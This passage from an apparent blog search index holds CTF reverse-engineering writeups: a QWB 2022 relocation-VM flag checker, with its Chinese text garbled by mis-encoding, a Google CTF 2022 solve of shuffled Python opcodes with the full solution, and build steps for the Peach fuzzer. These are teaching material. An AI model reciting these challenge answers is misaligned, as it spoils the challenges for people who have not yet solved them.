rela = [x for x in b.sections if x.name == \u0026#39;.rela.dyn\u0026#39;][0] dynsym = [x for x in b.sections if x.name == \u0026#39;.dynsym\u0026#39;][0] def format_addr(addr: int): if (addr \u0026gt;= rela.virtual_address and addr \u0026lt; rela.virtual_address + rela.size): offset = addr - rela.virtual_address r_offset = (offset // 24) r_rem = offset % 24 if r_rem == 0: return RelocAddr(Reloc(r_offset), \u0026#39;r_address\u0026#39;) elif r_rem == 8: return RelocAddr(Reloc(r_offset), \u0026#39;r_info\u0026#39;) elif r_rem == 16: return RelocAddr(Reloc(r_offset), \u0026#39;r_addend\u0026#39;) else: return RelocAddr(Reloc(r_offset), r_rem) elif (addr \u0026gt; dynsym.virtual_address and addr \u0026lt; dynsym.virtual_address + dynsym.size ): offset = addr - dynsym.virtual_address r_offset = (offset // 24) r_rem = offset % 24 if r_rem == 0: return SymAddr(Symbol(r_offset), \u0026#39;st_name\u0026#39;) elif r_rem == 8: return Symbol(r_offset) elif r_rem == 16: return SymAddr(Symbol(r_offset), \u0026#39;st_size\u0026#39;) else: return SymAddr(Symbol(r_offset), r_rem) elif addr \u0026gt;= 0x404040 and addr \u0026lt; 0x404040+0x21: off = addr-0x404040 return FlagAddr(off) elif addr == 0x804000: return BaseAddr() elif addr == 0x404064: return CheckAddr() else: return addr def parse(b) -\u0026gt; list: print(\u0026#39;[*] Loading relocations...\u0026#39;) relocs = list(b.relocations) print(\u0026#39;[*] Parsing...\u0026#39;) instructions = [] for i in range(3, len(relocs)): r = relocs[i] if r.type == 1: instructions.append( R64(format_addr(r.address), to_sym(r.symbol.name), format_addr(r.addend), i)) elif r.type == 5: # CPY instructions.append( Copy(format_addr(r.address), to_sym(r.symbol.name), i)) elif r.type == 8: # REL instructions.append( Rel(format_addr(r.address), format_addr(r.addend), i)) elif r.type == 7: # R32 # instructions.append( # R32(r.address, to_sym(r.symbol.name), r.addend, i)) instructions.append(R32(1, 1, 1, 1)) return instructions def dump(instructions): for op in instructions: if type(op).__name__ == \u0026#39;REL\u0026#39;: print(f\u0026#39;[{op.ridx:04d}] :: rel {op.dst}, {op.val}\u0026#39;) elif type(op).__name__ == \u0026#39;CPY\u0026#39;: print(f\u0026#39;[{op.ridx:04d}] :: copy {op.dst}, s{op.symbol}\u0026#39;) elif type(op).__name__ == \u0026#39;R64\u0026#39;: print(f\u0026#39;[{op.ridx:04d}] :: r64 {op.dst}, {op.symbol} + {op.addend}\u0026#39;) # å…¶å®æ˜¯ s{symbol} + {addend} elif type(op).__name__ == \u0026#39;R32\u0026#39;: print(\u0026#39;7\u0026#39;) if(op.ridx == 1266): break instructions = parse(b) dump(instructions) æå–åå‘ç°ä¸»è¦é€»è¾‘ä¸ºåŠ è½½ shellcode å¹¶æ‰§è¡Œ\nå…·ä½“è¿‡ç¨‹æ˜¯ä½¿ç”¨äº† rel æŒ‡ä»¤å°† shellcode ç§»åŠ¨åˆ°æŸä¸ªåœ°å€ï¼Œéšåä½¿ç”¨ r64 æŒ‡ä»¤è°ƒç”¨è¯¥åœ°å€\n[0005] :: rel s2, flag[0] [0006] :: rel s2.st_size, 1 [0007] :: copy s4, s2 [0009] :: rel r8.r_address, 0x16008040cc253480 [0010] :: rel r8.r_info, 0xc3 [0011] :: rel s3, r8.r_address [0012] :: rel s3.st_name, 0x1000a0000001a [0013] :: r64 r8.r_address, 3 + 0 ; è¿™é‡Œç›¸å½“äº call s3 [0014] :: rel s2, r101002.r_address [0015] :: rel s2.st_size, 0x18 [0016] :: copy r8.r_address, s2 [0018] :: rel r17.r_address, 0x8040cc250480 [0019] :: rel r17.r_info, 0xc3 [0020] :: rel s3, r17.r_address [0021] :: rel s3.st_name, 0x1000a0000001a [0022] :: r64 r17.r_address, 3 + 0 [0023] :: copy r17.r_address, s2 [0024] :: rel s2, s4 [0025] :: rel s2.st_size, 1 [0026] :: copy r3.r_address, s2 [0597] :: rel s2, r3.r_address [0598] :: rel s2.st_size, 8 [0599] :: copy s6, s2 [0601] :: rel r600.r_address, 0x70008040fc253480 [0602] :: rel r600.r_info, 0xc3 [0603] :: rel s3, r600.r_address [0604] :: rel s3.st_name, 0x1000a0000001a [0605] :: r64 r600.r_address, 3 + 0 [0606] :: rel s2, r101002.r_address [0607] :: rel s2.st_size, 0x18 [0608] :: copy r600.r_address, s2 [0609] :: rel s2, s6 [0610] :: rel s2.st_size, 8 [0611] :: copy r612.r_addend, s2 [0612] :: r64 s5, 5 + 0 [0613] :: rel r612.r_addend, 0 [0614] :: rel s6, 0 ä¸Šè¿°ä»£ç å¯¹ flag ç¬¬ä¸€ä½æ‰§è¡Œäº†ä¸¤å¤„ shellcodeï¼Œä½¿ç”¨ Capstone åˆ†æå‘ç° shellcode ä¸­çš„é€»è¾‘ä¸º f ^ 0x16 + 0 éšåå¯¹è¯¥å€¼ xor 0x70ï¼Œæœ€åå€¼ä¸º 0 è¡¨ç¤ºé€šè¿‡\nå‰28ä½flagå‡æ˜¯è¯¥é€»è¾‘çš„é‡å¤\nxor = [0x16, 0x17, 0x10, 0x12, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x24, 0x2c, 0x26, 0x1e, 0x1f, 0x20, 0x20, 0x21, 0x23, 0x27, 0x24, 0x25, 0x26, 0x27] add = [0x0, 0x1, 0x2, 0x3, 0x4, 0x5, 0x6, 0x7, 0x8, 0x9, 0xa, 0xb, 0xc, 0xd, 0xe, 0xf, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b] xor2 = [0x70, 0x7c, 0x73, 0x78, 0x6f, 0x27, 0x2a, 0x2c, 0x7f, 0x35, 0x2d, 0x32, 0x37, 0x3b, 0x22, 0x59, 0x53, 0x8e, 0x3d, 0x2a, 0x59, 0x27, 0x2d, 0x29, 0x34, 0x2d, 0x61, 0x32] for x1, a, x2 in zip(xor, add, xor2): print (chr((x2 - a) ^ x), end=\u0026#39;\u0026#39;) # flag{366c950370fec47e34581a0 å¯¹æœ€åå‡ ä½ flag è¿›è¡Œçš„è®¡ç®—æœ‰ä¸ªå° smc çš„æ“ä½œï¼š\n[1074] :: rel s2, flag[28] [1075] :: copy s6, s2 [1076] :: rel s2, flag[29] [1077] :: copy s7, s2 [1078] :: rel s8, 0 [1079] :: rel s2, s8 [1080] :: copy r1081.r_addend, s2 [1081] :: r64 s8, 8 + 0 ; ä¸Šä¸€ä¸ªæŒ‡ä»¤å°†æ­¤å¤„ä¿®æ”¹ä¸º r64 s8, s8 + s2, ç›¸å½“äº add s8, s2 [1082] :: rel r1081.r_addend, 0 [1083] :: rel s2, s6 [1084] :: copy r1085.r_addend, s2 [1085] :: r64 s8, 8 + 0 [1086] :: rel r1085.r_addend, 0 [1087] :: rel s9, 0 [1088] :: rel s2, s9 [1089] :: copy r1090.r_addend, s2 [1090] :: r64 s9, 9 + 0 [1091] :: rel r1090.r_addend, 0 [1092] :: rel s2, s7 [1093] :: copy r1094.r_addend, s2 [1094] :: r64 s9, 9 + 0 [1095] :: rel r1094.r_addend, 0 [1096] :: rel s2, s9 [1097] :: copy r1098.r_addend, s2 [1098] :: r64 s10, 8 + 0 [1099] :: rel r1098.r_addend, 0 [1101] :: rel r1100.r_address, 0x6c0080415c253480 [1102] :: rel r1100.r_info, 0xc3 [1103] :: rel s3, r1100.r_address [1104] :: rel s3.st_name, 0x1000a0000001a [1105] :: r64 r1100.r_address, 3 + 0 [1106] :: rel s2, r101002.r_address [1107] :: rel s2.st_size, 0x18 [1108] :: copy r1100.r_address, s2 [1109] :: rel s2, s10 [1110] :: rel s2.st_size, 8 [1111] :: copy r1112.r_addend, s2 [1112] :: r64 s5, 5 + 0 [1113] :: rel r1112.r_addend, 0 [1114] :: rel s6, 0 [1115] :: rel s7, 0 [1116] :: rel s8, 0 [1117] :: rel s9, 0 [1118] :: rel s10, 0 æ€»ç»“ä¸€ä¸‹ï¼š\n(flag[28] + flag[29]) ^ 0x6c = 0 (flag[28] * 2 + flag[29]) ^ 0xa1 = 0 (flag[30] + flag[31]) ^ 0xb1 = 0 (flag[30] * 2 + flag[31]) ^ 0xe5 = 0 è®¡ç®—å¾—åˆ°flagæœ€åå››ä½\n","date":"2022-08-02T23:23:23+08:00","image":"/post/qwb2022-rev-writeups/cover_huf3a3154eb771834b8e58d0981851333b_950314_120x120_fill_q75_box_smart1.jpg","permalink":"/post/qwb2022-rev-writeups/","title":"qwb 2022 rev writeups"},{"content":"This challenge gives a .pyc file and a Python 3.11 alpha7 based patch file.\nPatch This patch file mainly patches the opcode.py file. After the patch, opcode.py file first generated two random lists and modifies the opcode according to the values of the lists. Finally, it will output the new opcode to a tmp file.\n+import sys +if \u0026#34;generate_opcode_h\u0026#34; in sys.argv[0]: + random = __import__(\u0026#34;random\u0026#34;) + random.shuffle(perm) + random.shuffle(perm2) -def_op(\u0026#39;CACHE\u0026#39;, 0) -def_op(\u0026#39;POP_TOP\u0026#39;, 1) -def_op(\u0026#39;PUSH_NULL\u0026#39;, 2) +def_op(\u0026#39;CACHE\u0026#39;, perm[0]) +def_op(\u0026#39;POP_TOP\u0026#39;, perm[1]) +def_op(\u0026#39;PUSH_NULL\u0026#39;, perm[2]) +with open(\u0026#34;/tmp/opcode_map\u0026#34;, \u0026#34;w\u0026#34;) as f: + for x, y in enumerate(opname): + f.write(\u0026#34;%s %s\\n\u0026#34; % (x, y)) The patch file also modifies the ceval.c file, but I don\u0026rsquo;t understand what this does.\ndiff --git a/Python/ceval.c b/Python/ceval.c index 1d2c6432d0..e275158d9d 100644 --- a/Python/ceval.c +++ b/Python/ceval.c @@ -1344,6 +1344,8 @@ eval_frame_handle_pending(PyThreadState *tstate) #define OR_DTRACE_LINE #endif +#define USE_COMPUTED_GOTOS 0 + #ifdef HAVE_COMPUTED_GOTOS #ifndef USE_COMPUTED_GOTOS #define USE_COMPUTED_GOTOS 1 @@ -1705,6 +1707,7 @@ _PyEval_EvalFrameDefault(PyThreadState *tstate, _PyInterpreterFrame *frame, int #if USE_COMPUTED_GOTOS /* Import the static jump table */ #include \u0026#34;opcode_targets.h\u0026#34; + asdasdasd, break the compilation... #endif #ifdef Py_STATS Opcode Based on the information in the patch file, we came up with two ideas. One is to solve it by cracking the random number generator, and the other is to recover all opcodes manually.\nCracking the random number generator Since randon.shuffle is based on mt19937, cracking this requires providing 624 32bit numbers which is impossible. So we spent a lot of time on cracking the seed of the random number generator. For example, I found the file generation date of the patch file very suspicious, so I tried to use that time as random seed. We also used the sleeping hours to run the explosion program. Until we find:\nrandom.seed(a=None, version=2) Initialize the random number generator. If a is omitted or None, the current system time is used. If randomness sources are provided by the operating system, they are used instead of the system time (see the os.urandom() function for details on availability). We do not think there is any way to guess os.urandom(), so we focused on the second method.\nRecover opcodes by hand It\u0026rsquo;s difficult to disasm python 3.11 .pyc files, for the marshal and opcodes changes a lot. The newist tools I know is pycdc which still support python 3.10 only.\nI started with some easy functions. For example, it is obvious that __main__ start with import sys and followd with functions defination.\n0 RESUME 0 2 LOAD_CONST 0 4 LOAD_CONST 1 6 IMPORT_NAME 0 (sys) 8 STORE_NAME 0 26 LOAD_CONST 2 28 MAKE_FUNCTION 0 30 STORE_NAME 3 (ks) 68 LOAD_CONST 1 70 RETURN_VALUE 0 Therefore we got:\ncode op 0x61 RESUME 0x60 LOAD_CONST 0xab IMPORT_NAME 0x96 STORE_NAME 0x31 RETURN 0x63 MAKE_FUNCTION I also find there were lots of 20 00 in .pyc file. Which is CACHE, and we can ignore it.\nSince there were bugs in dis module after I change the opcode.py, I gave it up. But we can still use dis.show_code() to unserialize marshal.\n\u0026gt;\u0026gt;\u0026gt; import marshal, dis \u0026gt;\u0026gt;\u0026gt; fd = open(\u0026#39;x.pyc\u0026#39;, \u0026#39;rb\u0026#39;) \u0026gt;\u0026gt;\u0026gt; fd.seek(16) 16 \u0026gt;\u0026gt;\u0026gt; a = marshal.load(fd) \u0026gt;\u0026gt;\u0026gt; dis.show_code(a) Name: \u0026lt;module\u0026gt; Filename: /usr/local/google/home/xxxxxxxxx/yyyy/zzzzzzzzzzzzzzzz/xxxxxxxxxxx.py Argument count: 0 Positional-only arguments: 0 Kw-only arguments: 0 Number of locals: 0 Stack size: 2 Flags: 0x0 Constants: 0: 0 1: None 2: \u0026lt;code object ks at 0x101419470, file \u0026#34;/usr/local/google/home/xxxxxxxxx/yyyy/zzzzzzzzzzzzzzzz/xxxxxxxxxxx.py\u0026#34;, line 5\u0026gt; 3: \u0026lt;code object cry at 0x1016003f0, file \u0026#34;/usr/local/google/home/xxxxxxxxx/yyyy/zzzzzzzzzzzzzzzz/xxxxxxxxxxx.py\u0026#34;, line 11\u0026gt; 4: \u0026lt;code object fail at 0x101553000, file \u0026#34;/usr/local/google/home/xxxxxxxxx/yyyy/zzzzzzzzzzzzzzzz/xxxxxxxxxxx.py\u0026#34;, line 18\u0026gt; 5: \u0026lt;code object game1 at 0x12c704920, file \u0026#34;/usr/local/google/home/xxxxxxxxx/yyyy/zzzzzzzzzzzzzzzz/xxxxxxxxxxx.py\u0026#34;, line 23\u0026gt; 6: \u0026lt;code object game2 at 0x12c704cc0, file \u0026#34;/usr/local/google/home/xxxxxxxxx/yyyy/zzzzzzzzzzzzzzzz/xxxxxxxxxxx.py\u0026#34;, line 68\u0026gt; 7: \u0026lt;code object game3 at 0x12c7051f0, file \u0026#34;/usr/local/google/home/xxxxxxxxx/yyyy/zzzzzzzzzzzzzzzz/xxxxxxxxxxx.py\u0026#34;, line 96\u0026gt; 8: \u0026lt;code object main at 0x12c704f20, file \u0026#34;/usr/local/google/home/xxxxxxxxx/yyyy/zzzzzzzzzzzzzzzz/xxxxxxxxxxx.py\u0026#34;, line 123\u0026gt; Names: 0: sys 1: random 2: time 3: ks 4: cry 5: fail 6: game1 7: game2 8: game3 9: main \u0026gt;\u0026gt;\u0026gt; dis.show_code(a.co_consts[2]) Name: ks Filename: /usr/local/google/home/xxxxxxxxx/yyyy/zzzzzzzzzzzzzzzz/xxxxxxxxxxx.py Argument count: 1 Positional-only arguments: 0 Kw-only arguments: 0 Number of locals: 1 Stack size: 4 Flags: OPTIMIZED, NEWLOCALS, GENERATOR Constants: 0: None 1: True 2: 0 3: 255 4: 13 5: 17 6: 256 Names: 0: random 1: seed 2: randint Variable names: 0: seed \u0026gt;\u0026gt;\u0026gt; Start with the short function will be easier. For example, it is easy to recognize BINARY_OP and LOAD_FAST in function w() which defined in function game1().\nName: w Filename: /usr/local/google/home/xxxxxxxxx/yyyy/zzzzzzzzzzzzzzzz/xxxxxxxxxxx.py Argument count: 3 Positional-only arguments: 0 Kw-only arguments: 0 Number of locals: 3 Stack size: 3 Flags: OPTIMIZED, NEWLOCALS, NESTED Constants: 0: None 1: 10 2: 1 Variable names: 0: m 1: i 2: j 0x7a2 0x7c0 0 RESUME 0 2 LOAD_FAST 0 (m) 4 LOAD_FAST 1 (i) 6 LOAD_CONST 1 (10) 8 BINARY_OP 5 (*) 12 LOAD_FAST 2 (j) 14 BINARY_OP 0 (+) 18 BINARY_OP 9 (\u0026gt;\u0026gt;) 22 LOAD_CONST 2 (1) 24 BINARY_OP 1 (\u0026amp;) 28 RETURN_VALUE 0 Some important information of LOAD_* from docs:\nLOAD_CONST(consti)\nPushes co_consts[consti] onto the stack.\nLOAD_NAME(namei)\nLOAD_NAME [namei] Pushes co_names[x // 2] onto the stack.\nLOAD_FAST(var_num)\nPushes a reference to the local co_varnames[var_num] onto the stack.\nLOAD_METHOD(namei)\nLOAD_METHOD x Pushes co_names[x] onto the stack.\nBy recognize print () in main():\n0 RESUME 0 2 PUSH_NULL 4 LOAD_NAME 0 (print) 16 LOAD_CONST 1 (\u0026#39;Pass 3 tests to prove your worth!\u0026#39;) 18 PRECALL 1 22 CALL 1 32 POP_TOP 0 We got:\ncode op 0xB9 LOAD_NAME 0xBF PRECALL 0x8E CALL 0x01 POP_TOP 0x50 PUSH_NULL After recover all functions, we got:\ncode op 0x7b JUMP_BACKWARD 0xb6 FOR_ITER 0x1f GET_ITER 0x8d STORE_FAST 0x8f UNPACK_SEQUENCE 0x62 LOAD_FAST 0xc6 BINARY_OP (+, \u0026amp;, //, \u0026laquo;, @, *, %, |, **, \u0026raquo;, -, /, ^, +=) 0x74 BUILD_LIST 0x68 COMPARE_OP (\u0026rsquo;\u0026lt;\u0026rsquo;, \u0026lsquo;\u0026lt;=\u0026rsquo;, \u0026lsquo;==\u0026rsquo;, \u0026lsquo;!=\u0026rsquo;, \u0026lsquo;\u0026gt;\u0026rsquo;, \u0026lsquo;\u0026gt;=\u0026rsquo;) 0xba POP_JUMP_FORWARD_IF_FALSE 0x5d JUMP_FORWARD 0x92 LOAD_METHOD 0x88 BUILD_SLICE 0xaf POP_JUMP_BACKWARD_IF_TRUE 0x82 BUILD_TUPLE 0x75 CONTAINS_OP 0xb1 BUILD_CONST_KEY_MAP There\u0026rsquo;s still some opcode I didn\u0026rsquo;t recognize, but that doesn\u0026rsquo;t affect our decompilation anymore.\nThe decompilation result (by hand) was:\nimport sys import time import random def ks(seed): random.seed(seed) while 1: yield (random.randint(0, 255) * 13 + 17) % 256 def cry(s, seed): r = [] for x, y in zip(ks(seed), s): r.append(x ^ y) bytes(r) def fail(s): print (s) print (\u0026#34;Thanks for playing!\u0026#34;) sys.exit(0) def game1(): def w(m, i, j): return (m \u0026gt;\u0026gt; (i * 10 + j)) \u0026amp; 1 m = 1267034045110727999721745963007 fuel = 8 x, y = (1, 1) stops = set([(5, 4), (3, 3)]) log = \u0026#39;\u0026#39; print(\u0026#34;Fuels:\u0026#34;, fuel) for i in range(10): s = \u0026#39;\u0026#39; for j in range(10): if w(m, i, j): s += \u0026#39;ğŸ§±\u0026#39; elif (j, i) == (x, y): s += \u0026#39;ğŸš“\u0026#39; elif (j, i) == (8, 8): s += \u0026#39;ğŸ\u0026#39; elif (j, i) in stops: s += \u0026#39;â›½ï¸\u0026#39; else: s += \u0026#39; \u0026#39; print (s) inp = input().strip() for c in inp: log += c if c not in \u0026#39;wasd\u0026#39;: fail(\u0026#39;Nope!\u0026#39;) elif fuel == 0: fail(\u0026#39;Empty...\u0026#39;) dx, dy = {\u0026#39;w\u0026#39;:(0, -1), \u0026#39;s\u0026#39;:(0, 1), \u0026#39;a\u0026#39;:(-1, 0), \u0026#39;d\u0026#39;:(1, 0)}[c] x += dx y += dy if w(m, y, x): fail(\u0026#39;Crash!\u0026#39;) fuel -= 1 if (x, y) in stops: stops.remove((x, y)) fuel += 15 elif (x, y) == (8, 8): print (\u0026#39;Nice!\u0026#39;) return log def game2(): print (\u0026#39;Math quiz time!\u0026#39;) qs = ((\u0026#39;sum\u0026#39;, 12, 5), (\u0026#39;difference\u0026#39;, 45, 14), (\u0026#39;product\u0026#39;, 8, 9), (\u0026#39;ratio\u0026#39;, 18, 6), (\u0026#39;remainder from division\u0026#39;, 23, 7)) log = \u0026#39;_\u0026#39; for q in qs: print (\u0026#39;What is the %s of %d and %d?\u0026#39; % q) x, a, b = q if x == \u0026#39;sum\u0026#39;: r = a + b elif x == \u0026#39;difference\u0026#39;: r = a - b elif x == \u0026#39;product\u0026#39;: r = a * b elif x == \u0026#39;ratio\u0026#39;: r = a // b elif x == \u0026#39;remainder from division\u0026#39;: r = a % b else: print (\u0026#39;What?\u0026#39;) inp = int(input()) if inp == r: print (\u0026#39;Correct!\u0026#39;) log += str(inp) + \u0026#39;_\u0026#39; else: print (\u0026#39;Wrong!\u0026#39;) return log #_17_31_72_3_2_ def game3(): print (\u0026#39;Speed typing game.\u0026#39;) t = time.time() text = \u0026#39;\u0026#39;\u0026#39; Text: Because of its performance advantage, today many language implementations execute a program in two phases, first compiling the source code into bytecode, and then passing the bytecode to the virtual machine. \u0026#39;\u0026#39;\u0026#39; words = text.split() it = 1 log = \u0026#39;_\u0026#39; while it != len(words): print (\u0026#39;%0.2f seconds left.\u0026#39; % (20 - (time.time() - t))) print (\u0026#39;\\x1b[32m\u0026#39;, \u0026#39; \u0026#39;.join(words[:it]), \u0026#39;\\x1b[39m \u0026#39;, words[it]) inp = input() if time.time() \u0026gt; t + 20: fail(\u0026#39;Too slow!\u0026#39;) if inp == words[it]: log += words[it].upper() + \u0026#39;_\u0026#39; it += 1 else: fail(\u0026#39;You made a mistake!\u0026#39;) print (\u0026#39;Nice!\u0026#39;) return log #_BECAUSE_OF_ITS_PERFORMANCE_ADVANTAGE,_TODAY_MANY_LANGUAGE_IMPLEMENTATIONS_EXECUTE_A_PROGRAM_IN_TWO_PHASES,_FIRST_COMPILING_THE_SOURCE_CODE_INTO_BYTECODE,_AND_THEN_PASSING_THE_BYTECODE_TO_THE_VIRTUAL_MACHINE._ def main(): print(\u0026#39;Pass 3 tests to prove your worth!\u0026#39;) seed = \u0026#39;seed:\u0026#39; seed += game1() + \u0026#39;:\u0026#39; print (seed) seed += game2() + \u0026#39;:\u0026#39; print (seed) seed += game3() print (seed) print () print (\u0026#34;You can drive to work, know some maths and can type fast. You\u0026#39;re hired!\u0026#34;) print(\u0026#39;Your sign-on bonus:\u0026#39;, cry(b\u0026#39;\\xa0?n\\xa5\\x7f)\\x1f6Jvh\\x95\\xcc!\\x1e\\x95\\x996a\\x11\\xf6OV\\x88\\xc1\\x9f\\xde\\xb50\\x9d\\xae\\x14\\xde\\x18YHI\\xd8\\xd5\\x90\\x8a\\x181l\\xb0\\x16^O;]\u0026#39;, seed).decode()) SOLVE! import random def ks(seed): random.seed(seed) while 1: yield (random.randint(0, 255) * 13 + 17) % 256 def cry(s, seed): r = [] for x, y in zip(ks(seed), s): r.append(x ^ y) bytes(r) return r seed = \u0026#39;seed:sssddwwddwddsssdssaaawwssaaaassddddddd:_17_31_72_3_2_:_BECAUSE_OF_ITS_PERFORMANCE_ADVANTAGE,_TODAY_MANY_LANGUAGE_IMPLEMENTATIONS_EXECUTE_A_PROGRAM_IN_TWO_PHASES,_FIRST_COMPILING_THE_SOURCE_CODE_INTO_BYTECODE,_AND_THEN_PASSING_THE_BYTECODE_TO_THE_VIRTUAL_MACHINE._\u0026#39; print(\u0026#39;Your sign-on bonus:\u0026#39;, cry(b\u0026#39;\\xa0?n\\xa5\\x7f)\\x1f6Jvh\\x95\\xcc!\\x1e\\x95\\x996a\\x11\\xf6OV\\x88\\xc1\\x9f\\xde\\xb50\\x9d\\xae\\x14\\xde\\x18YHI\\xd8\\xd5\\x90\\x8a\\x181l\\xb0\\x16^O;]\u0026#39;, seed)) Afterword After failed to solve adamd in DEFCON 30 QUALS, I finally solved a Python 3.11 challenge :D\n","date":"2022-07-04T16:01:21+08:00","image":"/post/google-ctf-2022-mixed-writeup/cover_hue95b4dbc0185285c46e601051fa1d00b_430492_120x120_fill_q75_box_smart1.jpg","permalink":"/post/google-ctf-2022-mixed-writeup/","title":"Google CTF 2022 MIXED Writeup"},{"content":"Repository:\nhttps://gitlab.com/gitlab-org/security-products/protocol-fuzzer-ce\nModify from a dockerfile based on DEBIAN: https://raw.githubusercontent.com/vanhauser-thc/peachpro/main/Dockerfile\nshell sudo apt update sudo apt install -y \\ coreutils apt-utils wget curl openssl ca-certificates bash-completion \\ joe vim nano \\ unzip p7zip \\ hping3 httping thc-ipv6 gdb \\ tcpdump wireshark-common \\ locales-all \\ git build-essential joe vim strace tcpdump python python-pip python-is-python2\\ ruby doxygen libxml2-utils less openjdk-8-jre xsltproc asciidoctor \\ nodejs node-typescript wget \\ apt-transport-https dirmngr gnupg libtool-bin \\ cmake dos2unix g++-multilib --fix-missing cd ~/Downloads git clone https://gitlab.com/gitlab-org/security-products/protocol-fuzzer-ce cd protocol-fuzzer-ce git checkout 5697f699dc43593d69c44b8521a50976dfff266e cd paket/.paket wget https://github.com/fsprojects/Paket/releases/download/5.257.0/paket.bootstrapper.exe wget https://github.com/fsprojects/Paket/releases/download/5.257.0/paket.targets wget https://github.com/fsprojects/Paket/releases/download/5.257.0/paket.exe wget https://github.com/fsprojects/Paket/releases/download/5.257.0/Paket.Restore.targets cd ../../ wget https://software.intel.com/sites/landingpage/pintool/downloads/pin-3.20-98437-gf02b61307-gcc-linux.tar.gz mv pin-3.20-98437-gf02b61307-gcc-linux.tar.gz 3rdParty/pin/ cd 3rdParty/pin/ tar -xf pin-3.20-98437-gf02b61307-gcc-linux.tar.gz cd ../../ sed -i s/pin-3.19-98425-gcc-linux/pin-3.20-98437-gf02b61307-gcc-linux/g build/config/linux.py sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 3FA7E0328081BFF6A14DA29AA6A19B38D3D831EF # switch to root sudo su echo \u0026#34;deb https://download.mono-project.com/repo/ubuntu stable-bionic main\u0026#34; \u0026gt; /etc/apt/sources.list.d/mono-official-stable.list exit # exit root sudo apt update -y sudo apt install -y mono-devel mozroots --import --sync # check the mono version, should by 6.12.0 mono --version sed -i \u0026#39;/^int main.*/itemplate\u0026lt;bool b\u0026gt;\\nstruct StaticAssert {};\\ntemplate \u0026lt;\u0026gt;\\nstruct StaticAssert\u0026lt;true\u0026gt;\\n{\\n static void myassert() {}\\n};\\n\u0026#39; core/BasicBlocks/bblocks.cpp sed -i \u0026#39;s/STATIC_ASSERT(sizeof(size_t) == sizeof(ADDRINT))/StaticAssert\u0026lt;sizeof(size_t) == sizeof(ADDRINT)\u0026gt;::myassert()/g\u0026#39; core/BasicBlocks/bblocks.cpp ./waf configure ./waf build # Downgrade mono back to 4.x for installation and runtime sudo apt purge -y mono* libmono* doxygen sudo rm /etc/apt/sources.list.d/mono-official-stable.list sudo apt update -y sudo apt install -y mono-complete ./waf install # install binary is in ./output/linux_x86_64_release/bin # copy to peach dir cp -r output/linux_x86_64_release/bin /your_own_dir/to/peach cp -r output/doc/sdk /your_own_dir/peach/doc dockerfile FROM ubuntu:18.04 AS peachpro MAINTAINER vh@thc.org ARG DEBIAN_FRONTEND=noninteractive RUN apt-get update RUN apt-get install -y \\ coreutils apt-utils wget curl openssl ca-certificates bash-completion \\ joe vim nano \\ unzip p7zip \\ hping3 httping thc-ipv6 gdb \\ tcpdump wireshark-common \\ locales-all \\ git build-essential joe vim strace tcpdump python python-pip \\ ruby doxygen libxml2-utils less openjdk-8-jre xsltproc asciidoctor \\ nodejs node-typescript wget \\ apt-transport-https dirmngr gnupg libtool-bin \\ cmake dos2unix g++-multilib --fix-missing RUN git clone https://gitlab.com/gitlab-org/security-products/protocol-fuzzer-ce # Pin to a known version RUN cd protocol-fuzzer-ce \u0026amp;\u0026amp; \\ git checkout 5697f699dc43593d69c44b8521a50976dfff266e RUN echo \u0026#34;185.199.108.154 github.githubassets.com\u0026#34; \u0026gt;\u0026gt; /etc/hosts RUN echo \u0026#34;140.82.112.22 central.github.com\u0026#34; \u0026gt;\u0026gt; /etc/hosts RUN echo \u0026#34;185.199.108.133 desktop.githubusercontent.com\u0026#34; \u0026gt;\u0026gt; /etc/hosts RUN echo \u0026#34;185.199.108.153 assets-cdn.github.com\u0026#34; \u0026gt;\u0026gt; /etc/hosts RUN echo \u0026#34;185.199.108.133 camo.githubusercontent.com\u0026#34; \u0026gt;\u0026gt; /etc/hosts RUN echo \u0026#34;185.199.108.133 github.map.fastly.net\u0026#34; \u0026gt;\u0026gt; /etc/hosts RUN echo \u0026#34;199.232.69.194 github.global.ssl.fastly.net\u0026#34; \u0026gt;\u0026gt; /etc/hosts RUN echo \u0026#34;140.82.114.3 gist.github.com\u0026#34; \u0026gt;\u0026gt; /etc/hosts RUN echo \u0026#34;185.199.108.153 github.io\u0026#34; \u0026gt;\u0026gt; /etc/hosts RUN echo \u0026#34;140.82.114.4 github.com\u0026#34; \u0026gt;\u0026gt; /etc/hosts RUN echo \u0026#34;140.82.113.6 api.github.com\u0026#34; \u0026gt;\u0026gt; /etc/hosts RUN echo \u0026#34;185.199.108.133 raw.githubusercontent.com\u0026#34; \u0026gt;\u0026gt; /etc/hosts RUN echo \u0026#34;185.199.108.133 user-images.githubusercontent.com\u0026#34; \u0026gt;\u0026gt; /etc/hosts RUN echo \u0026#34;185.199.108.133 favicons.githubusercontent.com\u0026#34; \u0026gt;\u0026gt; /etc/hosts RUN echo \u0026#34;185.199.108.133 avatars5.githubusercontent.com\u0026#34; \u0026gt;\u0026gt; /etc/hosts RUN echo \u0026#34;185.199.108.133 avatars4.githubusercontent.com\u0026#34; \u0026gt;\u0026gt; /etc/hosts RUN echo \u0026#34;185.199.108.133 avatars3.githubusercontent.com\u0026#34; \u0026gt;\u0026gt; /etc/hosts RUN echo \u0026#34;185.199.108.133 avatars2.githubusercontent.com\u0026#34; \u0026gt;\u0026gt; /etc/hosts RUN echo \u0026#34;185.199.108.133 avatars1.githubusercontent.com\u0026#34; \u0026gt;\u0026gt; /etc/hosts RUN echo \u0026#34;185.199.108.133 avatars0.githubusercontent.com\u0026#34; \u0026gt;\u0026gt; /etc/hosts RUN echo \u0026#34;185.199.108.133 avatars.githubusercontent.com\u0026#34; \u0026gt;\u0026gt; /etc/hosts RUN echo \u0026#34;140.82.112.10 codeload.github.com\u0026#34; \u0026gt;\u0026gt; /etc/hosts RUN echo \u0026#34;52.217.44.188 github-cloud.s3.amazonaws.com\u0026#34; \u0026gt;\u0026gt; /etc/hosts RUN echo \u0026#34;52.217.33.196 github-com.s3.amazonaws.com\u0026#34; \u0026gt;\u0026gt; /etc/hosts RUN echo \u0026#34;52.216.93.147 github-production-release-asset-2e65be.s3.amazonaws.com\u0026#34; \u0026gt;\u0026gt; /etc/hosts RUN echo \u0026#34;52.216.93.147 github-production-user-asset-6210df.s3.amazonaws.com\u0026#34; \u0026gt;\u0026gt; /etc/hosts RUN echo \u0026#34;52.217.207.33 github-production-repository-file-5c1aeb.s3.amazonaws.com\u0026#34; 